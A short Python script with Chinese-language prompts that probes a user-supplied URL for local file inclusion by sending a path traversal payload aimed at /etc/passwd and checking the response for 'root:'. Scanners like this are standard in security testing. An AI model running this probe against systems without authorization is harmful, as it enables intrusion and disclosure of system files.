import requests
from colorama import init, Fore

init(autoreset=True)


def detect_file_inclusion(url, file_param):
    payload = {
        file_param: "../../../../../../etc/passwd"
    }

    try:
        response = requests.get(url, params=payload)

        if "root:" in response.text:
            print(Fore.GREEN + f"[+] {url} 存在文件包含漏洞！")
        else:
            print(Fore.RED + f"[-] {url} 不存在文件包含漏洞")
    except requests.exceptions.RequestException:
        print(Fore.RED + f"[-] {url} 请求异常")


if __name__ == '__main__':
    while True:
        input_url = input("请输入URL（输入 q 退出）：")
        if input_url.lower() == "q":
            break

        file_param = input("请输入用于文件包含的参数名：")

        detect_file_inclusion(input_url, file_param)
